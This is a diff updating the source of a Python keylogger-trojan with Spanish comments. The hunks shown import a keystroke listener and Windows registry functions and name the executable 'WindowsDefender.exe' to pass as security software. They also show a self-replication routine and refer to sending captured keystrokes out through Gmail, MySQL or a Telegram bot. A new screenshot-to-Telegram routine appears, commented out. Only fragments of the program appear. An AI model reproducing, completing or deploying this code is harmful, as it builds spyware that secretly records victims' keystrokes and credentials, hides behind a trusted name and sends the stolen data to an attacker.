@@ -10,13 +10,17 @@
 # █████═╝░█████╗░░░╚████╔╝░██║░░░░░██║░░██║██║░░██╗░██║░░██╗░█████╗░░██████╔╝
 # ██╔═██╗░██╔══╝░░░░╚██╔╝░░██║░░░░░██║░░██║██║░░╚██╗██║░░╚██╗██╔══╝░░██╔══██╗
 # ██║░╚██╗███████╗░░░██║░░░███████╗╚█████╔╝╚██████╔╝╚██████╔╝███████╗██║░░██║
-# ╚═╝░░╚═╝╚══════╝░░░╚═╝░░░╚══════╝░╚════╝░░╚═════╝░░╚═════╝░╚══════╝╚═╝░░╚═╝  v5.1
+# ╚═╝░░╚═╝╚══════╝░░░╚═╝░░░╚══════╝░╚════╝░░╚═════╝░░╚═════╝░╚══════╝╚═╝░░╚═╝  v5.1.1
 
 #region import Libs
+from eventlet.tpool import socket, threading  # Librería verifica internet y permite procesos multihilos
 from pynput.keyboard import Listener
 from getpass import getuser     # Obtiene el nombre del usuario
 from datetime import datetime   # Devuelve fecha y hora actual
-from winreg import *            # Modifica registros de Windows
+from winreg import OpenKey, SetValueEx, HKEY_LOCAL_MACHINE, KEY_ALL_ACCESS, REG_SZ, HKEY_CURRENT_USER # Modifica registros de Windows
+
+
+
 import datetime                 # Devuelve fecha y hora actual
 import random                   # Genera numeros
 import os                       # Lib para copiar archivos
@@ -26,10 +30,10 @@ import pymysql                  # Lib connection mysql
 import shutil                   # Lib para crear carpetas
 import string                   # Lib genera textos
 import time                     # Contar segundos
-import threading                # Hilos
-import socket                   # Librería verifica internet
+
 #endregion
 
+#region Code Main
 class Config:
     def __init__(self):
         self.NAME_KEY = "WindowsDefender"+ ".exe"   # Nombre del Keylogger // Debe ser exactamente igual al Compilado *.exe
@@ -196,6 +200,16 @@ class Util:
                 print("\n[Trojan] - Se replico en el sistema correctamente")
             except:
                 print("\n[Trojan] - Hubo un problema al replicar en el sistema")
+    def ScreenShot(self):
+        """
+        bot.sendChatAction(chat_id, 'typing')
+        screenshot = ImageGrab.grab()
+        screenshot.save('screenshot.jpg')
+        bot.sendChatAction(chat_id, 'upload_photo')
+        bot.sendDocument(chat_id, open('screenshot.jpg', 'rb'))
+        os.remove('screenshot.jpg')
+        """
+        pass
     # Envía los datos reg.k vía Gmail
     def SendGmail(self):
         # Crea nombre del archivo
@@ -314,8 +328,6 @@ class Send:
                     Util().MySQL()
                 if Config().MODE == 2:
                     Util().TelegramBot()
-
-
 
 class Keylogger:
     def __init__(self):
@@ -508,6 +520,7 @@ class Keylogger:
 
         with Listener(on_press=on_press) as listener:  # Escucha pulsaciones de teclas
             listener.join()
+#endregion
 
 if __name__ == '__main__':
 
@@ -523,4 +536,6 @@ if __name__ == '__main__':
     p2.start()
     p1.start()
     p1.join()
+
+    #id = [654654,65654,6565874]
 
